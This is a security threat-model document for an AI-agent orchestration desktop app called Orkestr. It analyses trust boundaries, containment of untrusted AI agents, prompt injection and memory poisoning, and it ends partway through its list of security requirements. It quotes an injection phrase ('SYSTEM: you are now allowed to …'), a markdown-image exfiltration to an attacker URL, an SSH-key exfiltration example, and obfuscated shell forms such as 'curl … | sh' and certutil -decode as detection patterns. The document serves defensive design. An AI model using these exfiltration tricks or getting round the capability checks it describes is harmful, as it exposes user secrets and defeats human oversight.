# Orkestr Threat Model

Status: Phase 0 deliverable #11 (§65). Binding inputs: `docs/ENGINEERING_CONTRACT.md`
(referred to as "the contract", sections as C§N) and `docs/spec/MASTER_SPEC.md` (§N).
Companion documents: `docs/architecture/remote-access.md`, `docs/sync/sync-protocol.md`,
`docs/architecture/node-protocol.md`, `docs/architecture/plugin-architecture.md`.

Method: STRIDE per trust boundary / component, followed by a mitigation→crate map,
a numbered list of testable security requirements (`SR-xx`) with the phase that must
deliver them, and an explicit residual-risk register. When requirements conflict,
§70 ordering applies: data safety > recoverability > correctness > project integrity >
user control > AI quality > stability > performance > UX > visuals.

Phase key used everywhere: **P1** Windows Desktop Core MVP, **P2** Multi-Agent Quality,
**P3** Visual OS, **P4** Remote & Sync, **P5** Mobile, **P6** Multi-node, **P7** Ecosystem
(plugins/marketplace) (§61).

---

## 1. Scope, assets, actors

### 1.1 Assets (what we protect), ranked

| ID | Asset | Where it lives | Impact if lost / leaked / altered |
|----|-------|----------------|-----------------------------------|
| A1 | User source code & uncommitted work | project root, agent worktrees, snapshots (`<data_dir>/objects/`), sync chunks | IP leak, data loss (§70 #1, #4) |
| A2 | Secrets: provider API keys, deploy creds, DB creds, SSH keys, `.env` values | `SecretStore` (OS keyring / encrypted vault), env of child processes | Financial loss, prod compromise |
| A3 | Production systems reachable via Deploy/Ssh/DbWrite tools | external | "Robot deleted prod DB" (§70) |
| A4 | Local machine integrity (OS, user files outside project) | host | Full compromise of user account |
| A5 | Core RPC bearer token & remote session credentials | memory, `<data_dir>` token file, device keystores | Equivalent to full control of Core |
| A6 | Device / node / sync private keys | OS keystore, Secure Enclave/StrongBox, WebCrypto non-extractable keys | Impersonation, decryption of sync data |
| A7 | Metadata: tasks, memory, decisions, audit log, event log | `orkestr.db` (SQLite WAL) | Integrity of history, privacy |
| A8 | Budget / provider quota | provider accounts | Cost overrun |
| A9 | Availability of local emergency controls | Core process | Inability to stop runaway agents |

### 1.2 Actors

| Actor | Trust | Notes |
|-------|-------|-------|
| Local user (owner) | Trusted | Principal `LocalUser`. Only principal that may change security policy. |
| Local OS processes of the same user | **Out of scope as adversary** for confidentiality (they can read the keyring), **in scope** for "do not make it easier" (token file ACLs, no world-readable files) | Same-user malware defeats any desktop app; see R-01. |
| Other local OS users / sandboxed apps on the host | Untrusted | Can reach `127.0.0.1` ports. |
| Web pages in the user's normal browser | Untrusted | Can attempt cross-site WebSocket hijacking / DNS rebinding against localhost. |
| AI agents (Manager, Executors, Reviewers) | **Untrusted autonomous actors** (§23) | May be steered by prompt injection; must be contained by capability checks, not by "good prompts". |
| AI providers (cloud) | Semi-trusted processors | See prompts/context we send; must never receive secrets. |
| Repository content, web pages, MCP/tool outputs, issue text, docs in Knowledge Base | Untrusted data | Primary prompt-injection vector. |
| Plugins & MCP servers | Untrusted code (unless first-party) | Sandboxed, permissioned (§48). |
| Gateway / relay operator (managed or self-hosted) | Trusted for availability and authentication gating, **untrusted for content** | Must not be able to read sync data or forge RPC calls (E2E, see remote-access.md). |
| Sync storage (S3/MinIO/managed) | Untrusted for confidentiality & integrity | Sees only ciphertext + coarse metadata. |
| Remote devices (web, mobile, other desktops) | Trusted after device authorization, revocable, role-limited | Lost/stolen devices are a primary scenario. |
| Worker nodes (P6) | Trusted per enrollment, least-privilege per job | A compromised node must not obtain other projects' secrets. |
| Network attacker | Untrusted | On-path between any two components. |

### 1.3 Explicitly out of scope

- Malware running as the same OS user with full privileges (R-01).
- Physical attacks on an unlocked, logged-in machine.
- Compromise of AI provider infrastructure itself (we limit what we send; we cannot
  control what they retain — handled by §56 privacy policies).
- Side channels on the host CPU.

---

## 2. System decomposition and trust boundaries

```mermaid
flowchart LR
  subgraph Host["User host (single OS user)"]
    subgraph Desktop["Tauri desktop process"]
      WV["Main webview (React UI)\nTB2"]
      FW["Floating robot / HUD webviews\nTB2"]
    end
    subgraph Core["orkestr-core (in-process or orkestrd)"]
      RPC["RPC server 127.0.0.1\nTB1"]
      SEC["PermissionEngine + DangerousActionGuard\n(orkestr-security)"]
      AR["Agent runtime / orchestrator\nTB3"]
      TERM["PTY sessions\nTB6"]
      PROV["Provider adapters\nTB5"]
      SYNC["Sync engine\nTB10"]
      PLUG["Plugin host\nTB8"]
      VAULT["SecretStore\nTB5"]
    end
    CLI["Claude Code / Codex CLIs\n(child processes)"]
    MCP["MCP servers / process plugins\n(child processes) TB8"]
    FS[("Project root + worktrees")]
    DB[("orkestr.db + objects/")]
  end
  WV -- "WS + bearer token" --> RPC
  FW -- "WS + bearer token" --> RPC
  RPC --> AR
  AR -- "check()" --> SEC
  AR --> TERM
  AR --> PROV
  PROV -- "HTTPS (rustls)" --> CloudAI["Cloud AI providers"]
  PROV --> CLI
  AR --> FS
  TERM --> FS
  PLUG --> MCP
  Core --> DB
  SYNC -- "E2E-encrypted chunks" --> Store[("Sync storage\nS3/MinIO/managed") ]
  Core -- "outbound mTLS tunnel TB9" --> GW["Gateway / relay"]
  GW -- "TLS + WebAuthn" --> Remote["Web / Mobile clients TB11"]
  GW -- "mTLS tunnel" --> Nodes["Worker nodes TB12"]
  Web["Untrusted web pages\n(browser agent, docs)"] -. "content (TB4)" .-> AR
  Repo["Repo content / issues"] -. "content (TB4)" .-> AR
```

| TB | Boundary | Crossing | First phase |
|----|----------|----------|-------------|
| TB1 | Local RPC | any local process ↔ Core over loopback WS/HTTP | P1 |
| TB2 | Embedded webview | rendered UI (incl. agent/repo-derived content) ↔ Tauri IPC ↔ RPC token | P1 |
| TB3 | Agent ↔ tools | model-chosen tool calls ↔ files, terminal, git, network, secrets | P1 |
| TB4 | Untrusted content → model context | repo files, web pages, MCP/tool output, KB docs → prompts | P1 |
| TB5 | Credentials | SecretStore ↔ providers / child processes / logs | P1 |
| TB6 | Terminal | agent or user ↔ PTY ↔ shell | P1 |
| TB7 | Filesystem / Git / worktrees | tool paths ↔ host filesystem | P1 |
| TB8 | Plugins & MCP servers | third-party code ↔ host APIs | P1 (MCP), P7 (plugins) |
| TB9 | Remote gateway | internet ↔ gateway ↔ tunnel ↔ Core | P4 |
| TB10 | Sync | device ↔ untrusted storage ↔ other devices | P4 (journal P1) |
| TB11 | Mobile / web clients | device ↔ gateway ↔ Core; push channels | P4/P5 |
| TB12 | Nodes | coordinator ↔ worker node | P6 |
| TB13 | Persistence & observability | Core ↔ SQLite / logs / events / crash dumps | P1 |
| TB14 | Supply chain & updates | build pipeline, dependencies, auto-updater, marketplace | P1 (updater), P7 |

---

## 3. STRIDE analysis per boundary

Legend: **S**poofing, **T**ampering, **R**epudiation, **I**nformation disclosure,
**D**enial of service, **E**levation of privilege. "M→" lists mitigations with the
requirement IDs from §5.

### TB1 — Local RPC (`orkestr-core` RPC server, C§3, C§4)

Context: Core binds `127.0.0.1:<ephemeral>`, WS `/rpc`, HTTP `/health`, 256-bit bearer
token, auth either via `Authorization` header or first `{"type":"auth"}` frame.

| | Threat | M→ |
|-|--------|----|
| S | Another local OS user, or a sandboxed app, connects to the loopback port and guesses/steals the token. | SR-01 (256-bit CSPRNG token, constant-time compare), SR-02 (token file ACL: owner-only; `core.json` holds no token), SR-05 (auth failure rate limiting) |
| S | **Cross-site WebSocket hijacking**: a web page in the user's browser opens `ws://127.0.0.1:<port>/rpc`. Browsers do not apply CORS to WebSockets. Without the token it cannot auth, but port scanning + `/health` fingerprinting is possible, and any future token leak to the page becomes RCE. | SR-03 (strict `Origin` allowlist; reject unknown Origin before upgrade), SR-04 (`Host` header must be `127.0.0.1:<port>` or `localhost:<port>` — DNS rebinding defence) |
| T | Malformed / oversized frames crash or wedge Core. | SR-06 (max frame 4 MiB default, max in-flight requests per connection, serde strict decoding, `deny_unknown_fields` on security-relevant params) |
| R | A client performs a destructive action and nothing attributes it. | SR-30 (audit every mutating method with principal, connection id, correlation id) |
| I | `/health` (unauthenticated) leaks more than version. | SR-07 (`/health` returns only `{status, version}`; no paths, no project names) |
| I | Events broadcast to a connection that subscribed to topics it should not see (matters once remote principals share the router). | SR-08 (topic authorization per principal at `sub` time and per event delivery) |
| D | Unauthenticated sockets held open; event flood to slow consumers. | SR-05 (5 s auth deadline, then close), SR-09 (bounded per-connection send queue; slow consumer gets `Log` warning then disconnect; never blocks EventBus) |
| E | Authenticated local client = full authority. A compromised webview (TB2) inherits that. | SR-10 (methods carry a `MethodPolicy`; security-policy-changing methods require `LocalUser` principal **and** a fresh local confirmation surfaced by the shell, not by the webview alone — P2), SR-11 (agents never get the RPC token; see TB3) |

Design note (deviation risk, see §7 Q1): the contract mandates loopback TCP. On
Windows a named pipe with an owner-only DACL (and Unix sockets elsewhere) would give
OS-enforced peer identity; we keep TCP per contract and compensate with SR-01..05.

### TB2 — Embedded webview (Tauri 2, `apps/desktop`)

Context: the webview receives `{url, token}` via the Tauri command `core_connection`
(C§3). It renders agent output, diffs, markdown, file contents, terminal output, all of
which can be attacker-influenced (TB4). **Any script execution in the webview = full
Core control** (it holds the token).

| | Threat | M→ |
|-|--------|----|
| S | Malicious content renders a fake approval dialog or fake "Manager" message. | SR-12 (approval UI is a dedicated component rendered from `ApprovalRequested` payload fields only; agent text shown in a visually distinct, labelled "agent-provided" region; approvals always display actor, capability, exact resource/command) |
| T | XSS via agent markdown, file names, commit messages, terminal escape sequences, Monaco hover content, Mermaid/SVG rendering. | SR-13 (strict CSP, see below), SR-14 (no `dangerouslySetInnerHTML` except through the single sanitizer wrapper in `@orkestr/ui`; markdown rendered with raw HTML disabled; SVG/Mermaid rendered in sandboxed iframe or sanitized), SR-15 (xterm: disable OSC 52 clipboard writes, restrict OSC 8 hyperlinks to `http(s)` with confirmation) |
| I | Agent output containing `![x](https://attacker/?q=<secret>)` auto-loads and exfiltrates data. | SR-16 (CSP `img-src 'self' data: blob:`; remote images in agent/repo content are not auto-loaded — click-to-load with URL shown) |
| I | Navigation to remote origin in the main webview gives that origin access to Tauri IPC. | SR-17 (main/HUD/robot windows never navigate off-app; `on_navigation` denies non-app URLs; external links open in the system browser; Browser Agent pages never load in an app webview — they run in a separate headless browser process, see TB4) |
| E | Tauri commands/plugins expose filesystem/shell to JS. | SR-18 (Tauri capability file grants only: `core_connection`, window controls, notification bridge; no `fs`, `shell`, `http` plugins exposed to the webview; all business data via RPC — C§2) |
| E | UI config / theme JSON authored by AI (§29) executes code. | SR-19 (UI config validated against `orkestr-protocol::ui_config` schema; no expressions, no URLs except allowlisted asset schemes; never eval'd — C§8) |

CSP baseline (P1, enforced in `tauri.conf.json`):

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';            # Monaco injects styles; revisit with nonces
img-src 'self' data: blob: asset: http://asset.localhost;
font-src 'self' data:;
connect-src 'self' ipc: http://ipc.localhost ws://127.0.0.1:* http://127.0.0.1:*;
worker-src 'self' blob:;                      # Monaco / xterm workers
frame-src 'self' orkestr-plugin:;             # sandboxed plugin/widget frames (P7)
object-src 'none'; base-uri 'none'; form-action 'none'
```

### TB3 — Agents as untrusted actors (`orkestr-agent-runtime`, `orkestr-orchestrator`)

| | Threat | M→ |
|-|--------|----|
| S | Agent claims to be the Manager / user in a handoff or message to another agent to obtain approval. | SR-20 (handoffs are typed structs with `from: AgentId` set by runtime, not by model text; approvals are never satisfiable by another agent — only by `LocalUser`/`RemoteDevice` principals) |
| T | Agent edits files outside its worktree (path traversal, symlinks, junctions, UNC, `\\?\`, 8.3 short names, ADS `file:stream`). | SR-21 (path confinement in `orkestr-security::paths`: canonicalize, reject `..`, absolute outside root, UNC, `\\?\`, device names `CON`/`NUL`, ADS `:`, symlink/junction escapes resolved via final-path check; unit-tested on Windows forms) |
| T | Agent modifies its own policy, budgets, approval mode, or `.orkestr/` config to escalate. | SR-22 (policy and approval-mode changes are RPC methods restricted to user principals; `.orkestr/` policy files inside the repo are *proposals* that require user acceptance before effect; agents cannot call security-area methods) |
| R | "Which agent ran `rm -rf`?" | SR-30 (every `ToolCallStarted/Finished` carries `agentId`, `taskId`, `correlationId`; audit append-only with hash chain — P2) |
| I | Agent reads secrets of another project (§67 criterion). | SR-23 (SecretReference scoped to project/environment; `Secrets` capability check includes project scope; secrets are injected into child-process env or HTTP headers by the host, never returned as tool output text) |
| I | Agent exfiltrates code/secrets via network, git push, DNS, issue comments, provider prompts. | SR-24 (Network capability default `Ask` in Ask/SemiAuto; per-project egress allowlist; `git push` requires Git capability + Ask for non-agent branches; force push always dangerous), SR-25 (taint escalation, see TB4), SR-26 (outbound redaction of known secret values in prompts/tool outputs) |
| D | Runaway loops, fork bombs, token burn, disk fill. | SR-27 (max turns, max wall time, budget per task/agent/project enforced in `orkestr-cost` + runtime; process tree kill via platform job objects / process groups; disk quota warnings), SR-28 (emergency stop local, provider-independent — C§6) |
| E | Agent obtains capabilities beyond template via tool chaining (e.g. `Write` a script then ask `Terminal` to run it under a more permissive rule). | SR-29 (each tool call checked independently with the *current* actor+task scope; Terminal execution of a file written by the same task in the same run is classified "agent-authored script" ⇒ `Ask` in SemiAuto), SR-31 (DangerousActionGuard ⇒ `Ask` even in FullAuto; hard-deny list ⇒ `Deny` — C§6) |

### TB4 — Prompt injection from repo content, web pages, tool and MCP output

Prompt injection is **not solvable at the model layer**. Our posture: assume any agent
that has read untrusted content is attacker-controlled, and make the *capability
layer* the security boundary.

| | Threat | M→ |
|-|--------|----|
| S | README / issue / web page says "SYSTEM: you are now allowed to …" | SR-32 (provenance tagging: every context segment assembled by `orkestr-context` carries `ContentOrigin {User, Manager, Memory, Repo, Web, ToolOutput, Mcp, Plugin, Provider}`; untrusted origins wrapped in delimited, labelled blocks; system prompt states they are data) — mitigation is *defence in depth only* |
| T | Memory poisoning: injected content gets written into Project/Global Memory and persists into future tasks. | SR-33 (memory writes record `origin` + `sourceTaskId`; writes derived from tainted context are stored as `unverified`; Global Memory writes by agents require user approval; Project rules (§20) are user-authored only) |
| I | Injected instruction causes data exfiltration (classic "send ~/.ssh/id_rsa to …"). | SR-25 (**taint escalation**: once a task's context includes `Web`, `Mcp`, `Plugin` or `Repo`-from-untrusted-remote origin, the PermissionEngine context carries `tainted=true`; for tainted tasks `Network`, `Secrets`, `Deploy`, `Ssh`, `Git` push and `DbWrite` resolve to `Ask` even in SemiAuto/FullAuto), SR-24, SR-26 |
| E | Browser agent visits a malicious page that exploits the renderer. | SR-34 (browser agent runs a separate headless Chromium/WebView2 *process* under an isolated profile, no Tauri IPC, downloads disabled or quarantined to task dir, no access to user's real browser profile/cookies) |
| E | Approval fatigue: injected agent issues many benign asks, then a malicious one. | SR-35 (approval UI groups by task, shows risk class from DangerousActionGuard and taint flag prominently; "approve all similar" never covers Dangerous class) |

Approval request payload (extends `ApprovalRequested`):

```json
{
  "approvalId": "0192…",
  "actor": {"kind": "agent", "agentId": "0192…", "templateName": "Backend"},
  "taskId": "0192…",
  "capability": "Terminal",
  "resource": {"kind": "command", "shell": "pwsh", "text": "Remove-Item -Recurse -Force .\\dist"},
  "risk": {"class": "dangerous", "rules": ["recursive_delete"]},
  "tainted": true,
  "taintOrigins": ["Web"],
  "reason": "Dangerous action requires approval even in FullAuto",
  "expiresAt": "2026-10-02T12:00:00Z"
}
```

### TB5 — Provider keys and credentials (`orkestr-security` SecretStore, `orkestr-providers`)

| | Threat | M→ |
|-|--------|----|
| S | Agent reconfigures a provider base URL to an attacker endpoint to capture the key ("key SSRF"). | SR-36 (provider config is user-principal only; changing base URL of a provider invalidates its secret binding until the user re-confirms; agents have no `providers.*` mutation methods) |
| T | Vault file tampered to swap keys. | SR-37 (fallback vault: XChaCha20-Poly1305/ChaCha20-Poly1305 AEAD with vault id + entry name as AAD; key in OS keyring — C§6) |
| I | Keys in logs, events, crash dumps, SQLite, prompts, child env. | SR-38 (`Secret<T>` wrapper with redacted `Debug`/`Display`/`Serialize` error; tracing redaction layer; DB stores `SecretReference` only; events carry references), SR-39 (child-process env is **built from an allowlist**, not inherited: provider keys and `ORKESTR_*` tokens are removed unless explicitly granted to that process), SR-26 |
| I | CLI agents (Claude Code, Codex): Orkestr reading their token files (forbidden, C§7). | SR-40 (adapters only invoke official CLIs; code review rule + test that adapters never open known credential paths) |
| E | A plugin or MCP server receives raw keys. | SR-41 (host-mediated secret injection: plugins name a `SecretReference`, host injects into the outbound request; plugin never sees plaintext — see plugin-architecture.md §5.4) |
| D | Key leakage leads to quota drain. | SR-27, provider budget caps in `orkestr-cost`; `ProviderRateLimited`/`BudgetThreshold` events |

### TB6 — Terminal (`orkestr-terminal`)

| | Threat | M→ |
|-|--------|----|
| S | Agent types into a **user-owned** terminal (which may have elevated sessions, ssh into prod, etc.). | SR-42 (terminals have an owner: `User` or `Agent(AgentId)`; `terminal.write` raw keystrokes to user-owned terminals only by user principals; agents use structured `terminal.exec` which runs one command in an agent-owned session) |
| T | Approval bypass by splitting a dangerous command across writes, using aliases, `iex`, base64 (`-EncodedCommand`), `cmd /c`, here-strings, env var expansion, line continuation. | SR-43 (agents never send raw keystrokes; `terminal.exec` takes a complete command string which DangerousActionGuard parses per shell; encoded/obfuscated forms (`-EncodedCommand`, `iex`, `Invoke-Expression`, `bash -c "$(…)"`, `curl … | sh`, `certutil -decode`) are classified dangerous; unknown parse ⇒ `Ask`) |
| T | Terminal output escape sequences attack the UI (TB2) or the user (spoofed prompts, clipboard writes). | SR-15 |
| I | Secrets echoed to terminal end up in history, events, sync, provider context. | SR-44 (`TerminalOutput` events pass through value-based redaction of known secrets; terminal history stored locally, excluded from sync by default; output fed back to model truncated and redacted) |
| D | Infinite output floods EventBus / UI. | SR-45 (output coalescing + rate cap per session; ring buffer; backpressure) |
| E | Command escapes worktree (cd elsewhere, absolute paths). | SR-46 (P1: working dir pinned to worktree, guard flags absolute paths outside root ⇒ Ask; P2: OS sandbox profiles — Windows Job Object + restricted token / AppContainer where practical, Linux bubblewrap/landlock, macOS `sandbox-exec`; containers where practical §23). Shell-level confinement remains best-effort → R-03 |

### TB7 — Filesystem, Git, worktrees (`orkestr-vcs`, `orkestr-snapshots`)

| | Threat | M→ |
|-|--------|----|
| T | Malicious repo config: `.git/config` `core.fsmonitor`, `core.sshCommand`, hooks, `filter.*.process`, `.gitattributes` filters execute code when Orkestr runs `git status`. | SR-47 (`orkestr-vcs` invokes git with `-c core.fsmonitor= -c core.hooksPath=<empty dir> -c protocol.ext.allow=never` for Core-initiated read operations; hooks only run for user-initiated commits/merges if project setting allows; `safe.directory` respected) |
| T | Destructive git ops (`push --force`, `reset --hard`, `clean -fd`, branch delete). | SR-31 (dangerous class), SR-48 (snapshot before risky/autonomous changes §25; rollback never destroys unrelated changes) |
| T | Concurrent worktree writes corrupt index. | SR-49 (per-repo git operation lock in `orkestr-vcs`; one writer per worktree) |
| I | Snapshots/objects contain secrets (`.env`). | SR-50 (snapshots honor `.gitignore` + `.orkestrignore`; secret-pattern files excluded from sync by default; objects dir owner-only ACL) |

### TB8 — Plugins and MCP servers (`orkestr-agent-runtime` tool registry, future `orkestr-plugins`)

Full design in `docs/architecture/plugin-architecture.md`.

| | Threat | M→ |
|-|--------|----|
| S | Typosquatted / forged plugin. | SR-51 (signature verification: publisher Ed25519 + marketplace countersignature; pinned hash at install; P7) |
| T | Plugin update silently adds permissions. | SR-52 (permission diff on update requires re-consent) |
| I | MCP server tool output carries injection (TB4) or MCP server exfiltrates data it receives. | SR-25 (MCP origin taints the task), SR-53 (MCP servers run as child processes with allowlisted env, scoped cwd, and each MCP tool is mapped to contract capabilities for `PermissionEngine.check`) |
| E | WASM escape / process plugin reads user files. | SR-54 (WASM: wasmtime, no WASI preopens beyond granted dirs, fuel/epoch + memory limits; process plugins: P7 OS sandbox profiles), SR-55 (UI plugins in sandboxed iframes without the RPC token; widgets get no filesystem/secrets automatically — §48) |
| D | Plugin hangs host. | SR-54 limits; plugin host runs plugins off the Core runtime threads; watchdog |

### TB9 — Remote gateway (P4; `docs/architecture/remote-access.md`)

| | Threat | M→ |
|-|--------|----|
| S | Credential stuffing, phishing of remote login. | SR-60 (WebAuthn/passkeys primary; phishing-resistant; TOTP only as second factor fallback, never sole factor), SR-61 (device authorization: new device must be approved on an already-trusted device or locally on the desktop, with SAS comparison) |
| S | Gateway operator / compromised relay impersonates a device to Core. | SR-62 (Core verifies device signatures itself — device public keys enrolled at Core during pairing; E2E session keys between device and Core; gateway cannot mint valid device sessions) |
| T | Relay modifies RPC frames. | SR-62 (AEAD on E2E channel; sequence numbers) |
| R | Remote action not attributable. | SR-30 + principal `RemoteDevice{deviceId,userId}` in every audit record; gateway audit separately |
| I | Raw Core/terminal port exposed to internet. | SR-63 (Core never listens on non-loopback; tunnel is **outbound** from Core; no port forwarding; §35/§64) |
| D | Login brute force, tunnel flood. | SR-64 (rate limiting at gateway per IP/account/device and at Core per device/method class → `rate_limited`) |
| E | Remote client changes security policy, adds devices, enables FullAuto, reads secrets. | SR-65 (`local_only` method policy: security policy, device enrollment approval, secret reveal/export, remote-access enablement, FullAuto enablement are local-only; dangerous approvals from remote require WebAuthn step-up with user verification within 5 min) |
| — | Kill switch. | SR-66 (local "Revoke Remote Sessions" / "Disable Remote" works with gateway unreachable: Core drops tunnel and refuses re-dial until local re-enable — §52) |

### TB10 — Sync (P4; `docs/sync/sync-protocol.md`)

| | Threat | M→ |
|-|--------|----|
| S | Storage server injects forged chunks/manifests. | SR-70 (AEAD per chunk with chunk id + workspace id in AAD; manifests and refs signed by device Ed25519 keys enrolled in the workspace key ring) |
| T | Rollback/freeze attack: server serves an older head. | SR-71 (version vectors are monotonic per device and persisted locally; client refuses a head dominated by its last-seen head; freeze detection via signed head timestamps + "last seen" from other devices via push) |
| I | Server reads code. | SR-72 (end-to-end encryption; keys never leave devices in plaintext; wrapped keys only — §40-44) |
| I | Metadata leakage (sizes, timing, number of files). | R-06 (accepted; padding of chunk sizes to 4 KiB buckets reduces precision) |
| I | Cross-tenant dedupe oracle ("does anyone have this file?"). | SR-73 (chunk ids are keyed BLAKE3 with a per-workspace key — no cross-workspace dedupe) |
| D | Malicious device floods sync with huge files. | SR-74 (per-device quotas, max file size policy, per-project exclusion rules) |
| E | Lost device continues to receive new data. | SR-75 (device revocation rotates the workspace data key for new data — forward secrecy for future writes; historical data already synced to that device is considered exposed — R-07) |
| — | Privacy policy `No Remote Sync` / `Self-Hosted Only` (§56) bypassed. | SR-76 (SyncBackend refuses projects whose policy forbids the backend's storage mode; checked at enqueue and at upload) |

### TB11 — Mobile and web clients (P4/P5)

| | Threat | M→ |
|-|--------|----|
| S | Stolen phone used to approve dangerous actions. | SR-77 (dangerous approvals require biometric/user-verifying WebAuthn assertion; app lock with OS biometrics; remote revoke from desktop) |
| I | Push notification content shown on lock screen leaks project/code details; push providers (APNs/FCM) see content. | SR-78 (push payload is encrypted and minimal: event id + category; app fetches details over the E2E channel; lock-screen text configurable "generic") |
| I | Device keys extracted. | SR-79 (keys in Secure Enclave / Android Keystore StrongBox; web: WebCrypto non-extractable keys in IndexedDB) |
| T | Malicious web client JS served by compromised gateway defeats E2E for the web client. | R-08 (accepted for web; mitigations: SRI, signed release manifests, CSP, recommend native/desktop for admin roles) |

### TB12 — Nodes (P6; `docs/architecture/node-protocol.md`)

| | Threat | M→ |
|-|--------|----|
| S | Rogue node registers and receives jobs. | SR-80 (node enrollment = device authorization flow; node identity key; mTLS + signed enrollment record) |
| T | Stale node (after partition) writes results after reassignment. | SR-81 (lease epoch fencing tokens on every job-side write) |
| I | Node receives secrets for projects it does not run. | SR-82 (secrets delivered per job, encrypted to node key, scoped to job's project/environment, TTL = lease; node trust levels) |
| E | Node policy weaker than coordinator. | SR-83 (job carries coordinator-signed policy snapshot; node PermissionEngine enforces `min(node local policy, job policy)`) |

### TB13 — Persistence and observability

| | Threat | M→ |
|-|--------|----|
| T | Audit log edited to hide actions. | SR-84 (audit table append-only via API; each record includes `prevHash` (BLAKE3 chain); verification command; P2) |
| I | Secrets in logs/crash dumps. | SR-38, SR-85 (panic hook redacts; crash dumps opt-in, exclude env) |
| I | Data dir readable by other users. | SR-02 (data dir created with owner-only ACL via `orkestr-platform`) |
| D | DB corruption on crash. | SQLite WAL, migrations reversible, crash recovery `Interrupted` tasks (C§5) |

### TB14 — Supply chain and updates

| | Threat | M→ |
|-|--------|----|
| T | Malicious dependency. | SR-86 (`cargo deny` + `cargo audit` + `npm audit` in CI; lockfiles committed; minimal deps) |
| T | Malicious update. | SR-87 (Tauri updater with signature verification, pinned public key; HTTPS only) |

---

## 4. Mitigation → crate map

| Mitigation area | Owning crate / package | SR IDs | Phase |
|-----------------|------------------------|--------|-------|
| RPC auth, Origin/Host checks, frame limits, MethodPolicy enforcement, per-connection principal | `orkestr-core` (rpc) with types in `orkestr-protocol` | 01,03-11,64 | P1 (MethodPolicy P2; remote principals P4) |
| Token generation, constant-time compare | as built: `orkestr-core` (`auth`); may move to `orkestr-security` when that crate is implemented | 01 | P1 |
| Owner-only ACLs for data dir/token file; process-tree kill; OS sandbox profiles; keyring | `orkestr-platform` | 02,27,46,54 | P1 (sandbox P2/P7) |
| PermissionEngine, scopes, approval modes, taint escalation | `orkestr-security` (`permission`) | 22,24,25,29,31 | P1 (taint P2) |
| DangerousActionGuard (pwsh/cmd/bash parsing) | `orkestr-security` (`guard`) | 31,43 | P1 |
| Path confinement | `orkestr-security` (`paths`) used by agent-runtime tools, terminal, vcs | 21 | P1 |
| SecretStore, `Secret<T>`, redaction layer | `orkestr-security` (`secrets`, `redact`) | 23,26,37,38,44 | P1 |
| Env allowlisting for child processes | `orkestr-platform` (`process::Command` builder) + `orkestr-terminal`, `orkestr-providers` | 39 | P1 |
| Audit log (hash chain) | `orkestr-security` (`audit`) + `orkestr-storage` | 30,84 | P1 (chain P2) |
| Provenance tagging, context assembly | `orkestr-context` | 32 | P2 (basic tagging P1) |
| Memory provenance | `orkestr-memory` | 33 | P1 |
| Tool loop budgets, turn limits, handoff typing | `orkestr-agent-runtime`, `orkestr-cost` | 20,27 | P1 |
| Emergency stop | `orkestr-core` + cancellation tokens across engines | 28,66 | P1 |
| Terminal ownership, `terminal.exec`, output redaction/coalescing, OSC filtering | `orkestr-terminal` + `apps/desktop` | 15,42-45 | P1 |
| Git hardening flags, op lock | `orkestr-vcs` | 47,49 | P1 |
| Snapshots before risky changes | `orkestr-snapshots` | 48,50 | P1 |
| CSP, Tauri capabilities, sanitizer, approval UI | `apps/desktop`, `@orkestr/ui` | 12-19,35 | P1 |
| Browser agent isolation | `orkestr-agent-runtime` (browser tool) + `orkestr-platform` | 34 | P2 |
| Plugin signing, sandbox, permissions | proposed `orkestr-plugins` (new crate, ADR required) | 51-55 | P7 (MCP part P1) |
| Gateway, WebAuthn, device auth, E2E channel | proposed `orkestr-gateway` (service) + `orkestr-core::remote` | 60-66,77-79 | P4/P5 |
| Sync encryption, signing, rollback protection | `orkestr-sync` | 70-76 | P4 |
| Node enrollment, fencing, per-job secrets | `orkestr-node` + `orkestr-task-engine` | 80-83 | P6 |
| Supply chain | CI config | 86,87 | P1 |

---

## 5. Security requirements (testable)

Each requirement must have at least one automated test (unit or integration) unless
marked *(review)*.

**Status of the RPC-surface requirements in the Phase 0 foundation
(2026-10-02)** — the requirements below are unchanged targets; this is where
the code stands:

| SR | Status | Evidence / gap |
|---|---|---|
| SR-01 | Met | `orkestr_core::auth::{generate_token, token_matches}` (`rand` + `subtle`), unit tests |
| SR-02 | Partly | `core.json` holds no token; files written via `platform::fs::write_private_file` (Unix `0600`); on Windows they inherit the profile ACL — no explicit DACL, no ACL test |
| SR-03 | **Not met** | no `Origin` check on the WS upgrade |
| SR-04 | Met (host name only) | `/rpc` rejects a non-loopback `Host` name (`127.0.0.1`, `localhost`, `::1`) with 403; the port is not compared; unit test `host_guard` |
| SR-05 | Partly | first non-`auth` frame ⇒ `unauthorized` + close 4401 (integration test); deadline is **10 s**, not 5 s; no failed-auth backoff |
| SR-06 | Partly | 4 MiB inbound limit and 64 in-flight requests (back-pressure, not rejection); not configurable; no dedicated test |
| SR-07 | Met | `/health` = `{status, version}`; integration test |
| SR-08 | Trivially met | single local principal; topic grants not implemented |
| SR-09 | Partly | outbound queue 512 frames; a lagging subscription gets a `seq:0` `Log` notice and the stream continues (no disconnect); the bus never blocks on slow sessions |
| SR-10 | Not met (P2) | no `MethodPolicy` |
| SR-11 | Not applicable yet | no agent processes or terminals exist; the token is redacted from logs (`orkestr_core::redact::register_secret`) |

| ID | Requirement | Test sketch | Phase |
|----|-------------|-------------|-------|
| SR-01 | RPC token: 32 bytes from a CSPRNG, rendered as 64 hex chars; compared with `subtle::ConstantTimeEq`. | unit: wrong token of equal length rejected; timing not asserted | P1 |
| SR-02 | `<data_dir>` and token file created owner-only (Windows DACL: current user SID + SYSTEM; Unix `0700`/`0600`). `core.json` contains no secret: `{url, token_file_hint, pid, version, started_at}`. | platform integration test reads ACL | P1 |
| SR-03 | WS upgrade rejected (HTTP 403) unless `Origin` ∈ {absent (non-browser clients), `tauri://localhost`, `http://tauri.localhost`, `https://tauri.localhost`, configured dev origin in debug builds}. | integration: `Origin: https://evil.example` → 403 | P1 |
| SR-04 | Requests with `Host` not equal to `127.0.0.1:<port>`/`localhost:<port>` rejected. | integration | P1 |
| SR-05 | Unauthenticated WS closed after 5 s or first non-`auth` frame; ≥5 failed auths/min from loopback → 1 min backoff (global, since loopback has no meaningful source). | integration | P1 |
| SR-06 | Frame size ≤ 4 MiB (configurable), ≤ 64 in-flight requests per connection. | integration | P1 |
| SR-07 | `/health` body exactly `{status, version}`. | integration | P1 |
| SR-08 | Event delivery filtered by principal's topic grants. | unit | P1 (trivial for LocalUser), P4 |
| SR-09 | Per-connection bounded queue (default 10k events); overflow → disconnect with `Log` event; EventBus never blocks. | unit | P1 |
